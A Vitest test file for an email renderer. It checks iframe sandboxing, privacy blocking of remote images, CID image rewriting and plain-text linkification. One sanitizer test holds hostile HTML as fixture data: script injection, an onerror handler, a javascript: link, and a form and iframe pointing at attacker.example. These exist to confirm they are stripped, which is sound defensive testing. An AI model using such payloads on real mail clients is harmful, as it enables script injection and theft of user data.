import { beforeAll, beforeEach, describe, expect, it } from 'vitest'
import { renderEmailBody } from './email-renderer'

const render = (options = {}) => {
  const container = document.createElement('div')
  document.body.append(container)
  const controller = renderEmailBody({
    container,
    html: '',
    text: '',
    mailbox: 'orders',
    messageId: '42',
    ...options,
  })
  return { container, controller, iframe: container.querySelector('iframe') }
}

const iframeDocument = (iframe) => {
  const doc = iframe.contentDocument
  doc.open()
  doc.write(
    '<!doctype html><html><head><style>html,body{margin:0}</style></head><body></body></html>',
  )
  doc.close()
  iframe.dispatchEvent(new Event('load'))
  return doc
}

beforeAll(() => {
  globalThis.CSSStyleRule = window.CSSStyleRule
  globalThis.CSSMediaRule = window.CSSMediaRule
})

beforeEach(() => {
  document.body.replaceChildren()
})

describe('received email rendering', () => {
  it('preserves safe email layout styles inside an isolated iframe', () => {
    const { container, iframe } = render({
      html: '<style>.card{color:red}@media(max-width:600px){.card{width:100%}}</style><table class="card" style="width:480px"><tr><td>Hello</td></tr></table>',
    })
    const doc = iframeDocument(iframe)
    const styles = [...doc.querySelectorAll('style')]
      .map((style) => style.textContent)
      .join('\n')

    expect(container.children).toHaveLength(1)
    expect(container.firstElementChild).toBe(iframe)
    expect(doc.querySelector('table').style.width).toBe('480px')
    expect(doc.querySelector('table').className).toBe('card')
    expect(styles).toContain('.card')
    expect(styles).toContain('@media')
  })

  it('keeps HTML structure when a message contains many stylesheets', () => {
    const styles = Array.from(
      { length: 16 },
      (_, index) => `<style>.product-${index}{padding:${index}px}</style>`,
    ).join('')
    const { iframe } = render({
      html: `${styles}<table class="product-15"><tr><td><a href="https://example.com/product"><img src="https://images.example.com/product.png" alt="Product"></a></td></tr></table>`,
    })
    const doc = iframeDocument(iframe)

    expect(doc.querySelector('table.product-15')).not.toBeNull()
    expect(doc.querySelector('a').textContent).toBe('')
    expect(doc.querySelector('img').alt).toBe('Product')
    expect(doc.querySelectorAll('style')).toHaveLength(2)
    expect(doc.body.textContent).not.toContain('<table')
  })

  it('preserves sender body presentation and compound layout selectors', () => {
    const { iframe } = render({
      html: '<html><head><style>body{font-family:Arial,sans-serif}u + #body .cta{display:inline-block;padding:12px 24px}.email-shell{max-width:600px}</style></head><body id="body" class="email-body" dir="ltr" style="background-color:#f4f4f4;color:#202124"><u></u><table class="email-shell"><tr><td><a class="cta" href="https://example.com">Open account</a></td></tr></table></body></html>',
    })
    const doc = iframeDocument(iframe)
    const styles = [...doc.querySelectorAll('style')]
      .map((style) => style.textContent)
      .join('\n')

    expect(doc.body.id).toBe('body')
    expect(doc.body.className).toBe('email-body')
    expect(doc.body.dir).toBe('ltr')
    expect(doc.body.style.backgroundColor).toBe('rgb(244, 244, 244)')
    expect(doc.body.style.color).toBe('rgb(32, 33, 36)')
    expect(doc.querySelector('.email-shell')).not.toBeNull()
    expect(doc.querySelector('.cta').textContent).toBe('Open account')
    expect(styles).toContain('u + #body .cta')
    expect(styles).toContain('.email-shell')
  })

  it('removes active content and makes external links safe', () => {
    const { iframe } = render({
      html: '<script>window.pwned=true</script><img src="data:image/png;base64,AA==" onerror="window.pwned=true"><form action="https://attacker.example"><input name="secret"><button>Send</button></form><iframe src="https://attacker.example"></iframe><a href="javascript:alert(1)" onclick="alert(2)">Bad</a><a href="https://example.com/account">Good</a>',
    })
    const doc = iframeDocument(iframe)

    expect(doc.querySelector('script')).toBeNull()
    expect(doc.querySelector('[onerror],[onclick]')).toBeNull()
    expect(doc.querySelector('form')).toBeNull()
    expect(doc.querySelector('iframe')).toBeNull()
    expect(doc.querySelector('input')).toBeNull()
    expect(doc.querySelector('a[href^="javascript:"]')).toBeNull()
    expect(
      doc.querySelector('a[href="https://example.com/account"]'),
    ).toMatchObject({ target: '_blank', rel: 'noopener noreferrer' })
  })

  it('rewrites CID images and permits only safe image data URIs', () => {
    const { iframe } = render({
      html: '<img id="cid" src="cid:logo%20one"><img id="bad-cid" src="cid:%ZZ"><img id="png" src="data:image/png;base64,AA=="><img id="svg" src="data:image/svg+xml;base64,AA==">',
    })
    const doc = iframeDocument(iframe)

    expect(doc.querySelector('#cid').getAttribute('src')).toBe(
      '/v1/inbucket/mailboxes/orders/messages/42/inline-image?cid=logo%20one',
    )
    expect(doc.querySelector('#bad-cid').getAttribute('src')).toBe(
      'about:blank',
    )
    expect(doc.querySelector('#png').getAttribute('src')).toBe(
      'data:image/png;base64,AA==',
    )
    expect(doc.querySelector('#svg').getAttribute('src')).toBe('about:blank')
  })

  it('blocks remote HTML and CSS images until the user loads them', () => {
    const { container } = render({
      html: '<style>.hero{background-image:url(https://tracker.example/background.png)}</style><img src="http://tracker.example/pixel.gif">',
    })
    let iframe = container.querySelector('iframe')
    let doc = iframeDocument(iframe)

    expect(container.textContent).toContain(
      'Remote images are blocked for privacy.',
    )
    expect(doc.documentElement.innerHTML).not.toContain(
      'https://tracker.example/background.png',
    )
    expect(doc.documentElement.innerHTML).not.toContain(
      'http://tracker.example/pixel.gif',
    )
    expect(iframe.getAttribute('src')).toBe('/v1/email-frame')

    container.querySelector('button').click()
    iframe = container.querySelector('iframe')
    doc = iframeDocument(iframe)

    expect(container.querySelector('.message-remote-content')).toBeNull()
    expect(doc.documentElement.innerHTML).toContain(
      'https://tracker.example/background.png',
    )
    expect(doc.documentElement.innerHTML).toContain(
      'http://tracker.example/pixel.gif',
    )
    expect(iframe.getAttribute('src')).toBe(
      '/v1/email-frame?remote_images=true',
    )
  })

  it('normalizes protocol-relative remote images after consent', () => {
    const { container, iframe } = render({
      html: '<img src="//images.example.com/product.png">',
    })
    let doc = iframeDocument(iframe)

    expect(doc.querySelector('img').getAttribute('src')).toBe('about:blank')

    container.querySelector('button').click()
    const allowedFrame = container.querySelector('iframe')
    doc = iframeDocument(allowedFrame)

    expect(doc.querySelector('img').getAttribute('src')).toBe(
      'https://images.example.com/product.png',
    )
  })

  it('renders plain text as text with clickable links and preserved whitespace', () => {
    const { iframe } = render({
      text: '<script>alert(1)</script>\nhttps://example.com/path\nwww.example.org\nmail@example.net',
    })
    const doc = iframeDocument(iframe)
    const links = [...doc.querySelectorAll('a')]

    expect(doc.querySelector('script')).toBeNull()
    expect(doc.body.textContent).toContain('<script>alert(1)</script>')
    expect(links.map((link) => link.href)).toEqual([
      'https://example.com/path',
      'https://www.example.org/',
      'mailto:mail@example.net',
    ])
    expect(doc.body.style.whiteSpace).toBe('pre-wrap')
  })

  it('uses a scriptless, formless, no-referrer frame', () => {
    const { iframe } = render({ html: '<p>Hello</p>' })

    expect(iframe.getAttribute('sandbox')).toBe(
      'allow-same-origin allow-popups allow-popups-to-escape-sandbox',
    )
    expect(iframe.getAttribute('sandbox')).not.toContain('allow-scripts')
    expect(iframe.getAttribute('sandbox')).not.toContain('allow-forms')
    expect(iframe.referrerPolicy).toBe('no-referrer')
    expect(iframe.hasAttribute('srcdoc')).toBe(false)
    expect(iframe.getAttribute('src')).toBe('/v1/email-frame')
  })

  it('cannot replace a newer message after its renderer is destroyed', () => {
    const container = document.createElement('div')
    document.body.append(container)
    const oldRenderer = renderEmailBody({
      container,
      html: '<img src="https://old.example/image.png"><p>Old</p>',
      text: '',
      mailbox: 'old',
      messageId: '1',
    })
    oldRenderer.destroy()
    renderEmailBody({
      container,
      html: '<p>New message</p>',
      text: '',
      mailbox: 'new',
      messageId: '2',
    })
    const activeFrame = container.querySelector('iframe')
    const activeDocument = iframeDocument(activeFrame)

    oldRenderer.setRemoteImagesAllowed(true)

    expect(activeDocument.body.textContent).toContain('New message')
    expect(activeDocument.documentElement.innerHTML).not.toContain(
      'old.example',
    )
  })
})
